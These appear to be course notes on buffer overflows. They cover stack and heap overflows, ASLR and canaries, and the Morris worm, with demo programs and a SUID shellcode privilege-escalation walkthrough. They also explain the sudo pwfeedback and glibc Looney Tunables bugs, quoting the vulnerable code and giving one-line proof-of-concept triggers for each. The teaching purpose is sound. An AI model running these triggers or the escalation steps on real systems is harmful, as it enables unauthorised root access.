# Buffer Overflows

## What are buffer overflows

### The Basics

![Buffer Overflow Introductory](figures/BufferOverflowIntroductory.png)
([image source](https://en.wikipedia.org/wiki/Buffer_overflow))

- Overwrites of memory through overfilling evaluated memory space

### Why can buffer overflows be bad

- Can lead to exploits where overwrites of variables and function pointers, along with the functions themselves, can cause unintended behavior (includes crashing code and stuff).

### Methods

- Stack Based Exploits
  - Basic variables and stuff
- Heap based exploits

  - Done with heap memory, something like a `malloc`
  - Heap based stack overflows usually are smaller and are harder to detect

### Protection Methods

- **Address space layout randomization (ASLR)** randomizes the memory addresses of certain data points involved in a process each time it is run
- **Stack canaries** are known values placed around a buffer such that they would be corrupted in the event of a buffer overflow

### Morris Worm

- famous exploit released November 2nd, 1988
  - used buffer overflows (among other exploitation methods)
  - used known source code of fingerd to overwrite return address in stack frame (same as demo 4)
  - executes code segment that creates a new shell (as root)

## Demos

- Working demo
- Basic Variable Overwriting
- Changing the function pointer
  - using payloads to change pointers
- Rewrite the return address
- Adding shellcode to binary

`working_demo.c`

`working_demo.c` is a proof of concept (POC) of the concept of buffer overflows. It's a simply strcopy that doesn't check for size, which can overflow the buffer.

To run, use these following commands:

```sh
# run whatever you want, you can overflow the buffer if you enter more than ~5 characters
make working_demo ARGS=aaaaaaaa
```

`changing_variable.c`

`changing_variable.c` demonstrates how buffer overflow can change / overwrite a variable name. When one overflows the buffer, the following variable's value will be overwritten, which is detected by the program and printed to output.

To run, use these following commands:

```sh
# this will hopefully overwrite the buffer, changing the variable
make variable_change
> msksmadsmfnadsf
```

`function_pointing.c`

`function_pointing.c` demonstrates the use of gdb and how one can overwrite functions to perform actions that are not intended by the writers of the program (in this case, of course, it's fully intended, but let's ignore that). By default, the normal function will run, but through overwriting of variables the special or the other function can be run.

There are two functions that can be substituted into the program, one which uses simple piping while the other one uses more complex payloads.

To run, use/execute these following commands:

```sh
make function_pointing
gdb functions
# inside gdb find the function pointers either for the special function or the other function
# then you could either do a run <<< python -c "print('A' * 13 [enough to overflow] + pointer code)"
# or first write that into a payload and then insert it into the run function
```

#### Demo 4

#### Stack Background

- **Stack Frame** is one procedure on the call stack
  - parameters
  - **return address** is where execution should return when stack frame is completed (can be exploited!)
  - old **frame pointer** (pointer from which other elements in the frame can be accessed)
  - local variables

<img src="https://github.com/user-attachments/assets/26003099-52c0-4365-a1f6-ca16e9dd5d81" alt="screenshot" width="600"/>

#### Shell Exploit + Explanation

- We are given code that takes an input and puts it into a char array, but can overflow
- This overflow can be manipulated to output Assembly commands
- The program has the SUID bit, so it can be run as the user
- Through use of Assembly, you can switch users to the owner of the file
- The code exploited is this code, and the goal is to switch to the user of the owner of the file:
- "Sledding"

```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

- To exploit the code:
  - Use gdb to find the memory location of the buffer
    - First, gdb the file
    - Then, `run ($python -c "print([the input below, replacing the memory address with more junk])")`
    - Then, run `x/100x $rsp-200` to output the memory, and find the memory address of a place with no operators
  - As the input, put in an arbitrary number of no operators, then shell code, then junk code, then the memory address found using gdb. The total length should add to 158
  - Pwntools can be used to find the shellcode for switching users, which is to be put before shellcode for making a shell

### Pwfeedback ( ! Add cves)

The pwfeedback bug is the a bug in the `sudo` package, especially in the code that allows for `*` feedback, which is also called `pwfeedback`. If pwfeedback is enabled, an error is created through a simple forgetting of variables.

```c
// tgetpass.c
...
static char * getln(int fd, char *buf, size_t bufsiz, int feedback) {
    size_t left = bufsiz;
    ssize_t nr = -1;
    char *cp = buf;
    char c = '\0';
    debug_decl(getln, SUDO_DEBUG_CONV)

    if (left == 0) {
	errno = EINVAL;
	debug_return_str(NULL);		/* sanity */
    }

    while (--left) {
	nr = read(fd, &c, 1);
	if (nr != 1 || c == '\n' || c == '\r')
	    break;
	if (feedback) {
	    if (c == sudo_term_kill) {
		while (cp > buf) {
		    if (write(fd, "\b \b", 3) == -1)
			break;
		    --cp;
		}
		left = bufsiz;
		continue;
	    } else if (c == sudo_term_erase) {
		if (cp > buf) {
		    if (write(fd, "\b \b", 3) == -1)
			break;
		    --cp;
		    left++;
		}
		continue;
	    }
	    ignore_result(write(fd, "*", 1));
	}
	*cp++ = c;
    }
    ...
```

If pwfeedback is enabled (the feedback boolean), and sudo term kill occurs, the code will try to delete the buffer, but it wouldn't work because pipes (if you pip in the password) is unidirectional. That means that the `left` pointer will get updated, but n ot the `cp` pointer, which means that you can overflow the buffer. Since the buffer is defined as `static char buf[SUDO_CONV_REPL_MAX + 1];` and the max size is defined as `#define SUDO_CONV_REPL_MAX	255` Through this, one can overflow the the `TGP_ASKPASS` below, which can set uid and gid to zero and give a shell, providing privilege execution.

**POC**: `perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id`

#### Looney Tunables

<img src="figures/LooneyTunes.png" alt="drawing" width="200"/>

([image source](https://www.imdb.com/title/tt8543208/))

Looney Tunables is a bug within the glibc package that doesn't account for malicious formatting of the `GLIBC_TUNABLES` variable. Glibc deals with .so, and the part that we're concerned about relates to malformed input for the c code to relate to the malformed pair. For example, usually the format for each tunable is `tunable1=AAA`. When it is instead misformed with an additional `=` sign, the pointer in line 247 doesn't change and it will overflow.

```c
static void parse_tunables (char *tunestr, char *valstring) {
  char *p = tunestr;
  size_t off = 0;
  while (true)
    {
      char *name = p;
      size_t len = 0;
      /* First, find where the name ends.  */
      while (p[len] != '=' && p[len] != ':' && p[len] != '\0')
        len++;
      /* If we reach the end of the string before getting a valid name-value
         pair, bail out.  */
      if (p[len] == '\0')
        {
          if (__libc_enable_secure)
            tunestr[off] = '\0';
          return;
        }
      /* We did not find a valid name-value pair before encountering the
         colon.  */
      if (p[len]== ':')
        {
          p += len + 1;
          continue;
        }
      p += len + 1;
      /* Take the value from the valstring since we need to NULL terminate it.  */
      char *value = &valstring[p - tunestr];
      len = 0;
      while (p[len] != ':' && p[len] != '\0')
        len++;
      /* Add the tunable if it exists.  */
      for (size_t i = 0; i < sizeof (tunable_list) / sizeof (tunable_t); i++)
        {
          tunable_t *cur = &tunable_list[i];
          if (tunable_is_name (cur->name, name))
            {
              if (__libc_enable_secure)
                {
                  if (cur->security_level != TUNABLE_SECLEVEL_SXID_ERASE)
                    {
                      if (off > 0)
                        tunestr[off++] = ':';
                      const char *n = cur->name;
                      while (*n != '\0')
                        tunestr[off++] = *n++;
                      tunestr[off++] = '=';
                      for (size_t j = 0; j < len; j++)
                        tunestr[off++] = value[j];
                    }
                  if (cur->security_level != TUNABLE_SECLEVEL_NONE)
                    break;
                }
              value[len] = '\0';
              tunable_initialize (cur, value);
              break;
            }
        }
      if (p[len] != '\0')
        p += len + 1;
    }
}
```

**POC**:`env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help`
